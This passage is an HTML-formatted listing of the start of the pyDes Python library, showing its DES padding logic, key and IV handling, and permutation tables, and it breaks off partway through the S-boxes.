class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># _pythonMajorVersion is used to handle Python2 and Python3 differences.</span></span><br><span class="line">_pythonMajorVersion = sys.version_info[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># Modes of crypting / cyphering</span></span><br><span class="line">ECB = <span class="number">0</span></span><br><span class="line">CBC = <span class="number">1</span></span><br><span class="line"><span class="comment"># Modes of padding</span></span><br><span class="line">PAD_NORMAL = <span class="number">1</span></span><br><span class="line">PAD_PKCS5 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PAD_PKCS5: is a method that will unambiguously remove all padding</span></span><br><span class="line"><span class="comment">#            characters after decryption, when originally encrypted with</span></span><br><span class="line"><span class="comment">#            this padding mode.</span></span><br><span class="line"><span class="comment"># For a good description of the PKCS5 padding technique, see:</span></span><br><span class="line"><span class="comment"># http://www.faqs.org/rfcs/rfc1423.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The base class shared by des and triple des.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_baseDes</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> IV:</span><br><span class="line">            IV = self._guardAgainstUnicode(IV)</span><br><span class="line">        <span class="keyword">if</span> pad:</span><br><span class="line">            pad = self._guardAgainstUnicode(pad)</span><br><span class="line">        self.block_size = <span class="number">8</span></span><br><span class="line">        <span class="comment"># Sanity checking of arguments.</span></span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">and</span> padmode == PAD_PKCS5:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Cannot use a pad character with PAD_PKCS5"</span>)</span><br><span class="line">        <span class="keyword">if</span> IV <span class="keyword">and</span> len(IV) != self.block_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Invalid Initial Value (IV), must be a multiple of "</span> + str(self.block_size) + <span class="string">" bytes"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set the passed in variables</span></span><br><span class="line">        self._mode = mode</span><br><span class="line">        self._iv = IV</span><br><span class="line">        self._padding = pad</span><br><span class="line">        self._padmode = padmode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""getKey() -&gt; bytes"""</span></span><br><span class="line">        <span class="keyword">return</span> self.__key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setKey</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""Will set the crypting key for this object."""</span></span><br><span class="line">        key = self._guardAgainstUnicode(key)</span><br><span class="line">        self.__key = key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getMode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""getMode() -&gt; pyDes.ECB or pyDes.CBC"""</span></span><br><span class="line">        <span class="keyword">return</span> self._mode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setMode</span><span class="params">(self, mode)</span>:</span></span><br><span class="line">        <span class="string">"""Sets the type of crypting mode, pyDes.ECB or pyDes.CBC"""</span></span><br><span class="line">        self._mode = mode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPadding</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""getPadding() -&gt; bytes of length 1. Padding character."""</span></span><br><span class="line">        <span class="keyword">return</span> self._padding</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setPadding</span><span class="params">(self, pad)</span>:</span></span><br><span class="line">        <span class="string">"""setPadding() -&gt; bytes of length 1. Padding character."""</span></span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pad = self._guardAgainstUnicode(pad)</span><br><span class="line">        self._padding = pad</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPadMode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""getPadMode() -&gt; pyDes.PAD_NORMAL or pyDes.PAD_PKCS5"""</span></span><br><span class="line">        <span class="keyword">return</span> self._padmode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setPadMode</span><span class="params">(self, mode)</span>:</span></span><br><span class="line">        <span class="string">"""Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5"""</span></span><br><span class="line">        self._padmode = mode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getIV</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""getIV() -&gt; bytes"""</span></span><br><span class="line">        <span class="keyword">return</span> self._iv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setIV</span><span class="params">(self, IV)</span>:</span></span><br><span class="line">        <span class="string">"""Will set the Initial Value, used in conjunction with CBC mode"""</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> IV <span class="keyword">or</span> len(IV) != self.block_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Invalid Initial Value (IV), must be a multiple of "</span> + str(self.block_size) + <span class="string">" bytes"</span>)</span><br><span class="line">        IV = self._guardAgainstUnicode(IV)</span><br><span class="line">        self._iv = IV</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_padData</span><span class="params">(self, data, pad, padmode)</span>:</span></span><br><span class="line">        <span class="comment"># Pad data depending on the mode</span></span><br><span class="line">        <span class="keyword">if</span> padmode <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># Get the default padding mode.</span></span><br><span class="line">            padmode = self.getPadMode()</span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">and</span> padmode == PAD_PKCS5:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Cannot use a pad character with PAD_PKCS5"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> padmode == PAD_NORMAL:</span><br><span class="line">            <span class="keyword">if</span> len(data) % self.block_size == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># No padding required.</span></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pad:</span><br><span class="line">                <span class="comment"># Get the default padding.</span></span><br><span class="line">                pad = self.getPadding()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pad:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"Data must be a multiple of "</span> + str(</span><br><span class="line">                    self.block_size) + <span class="string">" bytes in length. Use padmode=PAD_PKCS5 or set the pad character."</span>)</span><br><span class="line">            data += (self.block_size - (len(data) % self.block_size)) * pad</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> padmode == PAD_PKCS5:</span><br><span class="line">            pad_len = <span class="number">8</span> - (len(data) % self.block_size)</span><br><span class="line">            <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">                data += pad_len * chr(pad_len)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data += bytes([pad_len] * pad_len)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_unpadData</span><span class="params">(self, data, pad, padmode)</span>:</span></span><br><span class="line">        <span class="comment"># Unpad data depending on the mode.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">if</span> pad <span class="keyword">and</span> padmode == PAD_PKCS5:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Cannot use a pad character with PAD_PKCS5"</span>)</span><br><span class="line">        <span class="keyword">if</span> padmode <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># Get the default padding mode.</span></span><br><span class="line">            padmode = self.getPadMode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> padmode == PAD_NORMAL:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pad:</span><br><span class="line">                <span class="comment"># Get the default padding.</span></span><br><span class="line">                pad = self.getPadding()</span><br><span class="line">            <span class="keyword">if</span> pad:</span><br><span class="line">                data = data[:-self.block_size] + \</span><br><span class="line">                       data[-self.block_size:].rstrip(pad)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> padmode == PAD_PKCS5:</span><br><span class="line">            <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">                pad_len = ord(data[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pad_len = data[<span class="number">-1</span>]</span><br><span class="line">            data = data[:-pad_len]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_guardAgainstUnicode</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="comment"># Only accept byte strings or ascii unicode values, otherwise</span></span><br><span class="line">        <span class="comment"># there is no way to correctly decode the data into bytes.</span></span><br><span class="line">        <span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, unicode):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"pyDes can only work with bytes, not Unicode strings."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="comment"># Only accept ascii unicode values.</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> data.encode(<span class="string">'ascii'</span>)</span><br><span class="line">                <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">"pyDes can only work with encoded strings, not Unicode."</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">des</span><span class="params">(_baseDes)</span>:</span></span><br><span class="line">    <span class="string">"""DES encryption/decrytpion class</span></span><br><span class="line"><span class="string">    Supports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.</span></span><br><span class="line"><span class="string">    pyDes.des(key,[mode], [IV])</span></span><br><span class="line"><span class="string">    key  -&gt; Bytes containing the encryption key, must be exactly 8 bytes</span></span><br><span class="line"><span class="string">    mode -&gt; Optional argument for encryption type, can be either pyDes.ECB</span></span><br><span class="line"><span class="string">        (Electronic Code Book), pyDes.CBC (Cypher Block Chaining)</span></span><br><span class="line"><span class="string">    IV   -&gt; Optional Initial Value bytes, must be supplied if using CBC mode.</span></span><br><span class="line"><span class="string">        Must be 8 bytes in length.</span></span><br><span class="line"><span class="string">    pad  -&gt; Optional argument, set the pad character (PAD_NORMAL) to use</span></span><br><span class="line"><span class="string">        during all encrypt/decrypt operations done with this instance.</span></span><br><span class="line"><span class="string">    padmode -&gt; Optional argument, set the padding mode (PAD_NORMAL or</span></span><br><span class="line"><span class="string">        PAD_PKCS5) to use during all encrypt/decrypt operations done</span></span><br><span class="line"><span class="string">        with this instance.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Permutation and translation tables for DES</span></span><br><span class="line">    __pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">             <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">             <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">             <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">             <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">             <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">             <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">             <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">             ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># number left rotations of pc1</span></span><br><span class="line">    __left_rotations = [</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># permuted choice key (table 2)</span></span><br><span class="line">    __pc2 = [</span><br><span class="line">        <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">9</span>,</span><br><span class="line">        <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line">        <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initial permutation IP</span></span><br><span class="line">    __ip = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">            <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Expansion table for turning 32 bit blocks into 48 bits</span></span><br><span class="line">    __expansion_table = [</span><br><span class="line">        <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The (in)famous S-boxes</span></span><br><span class="line">    __sbox = [</span><br><span class="line">        <span class="comment"># S1</span></span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, 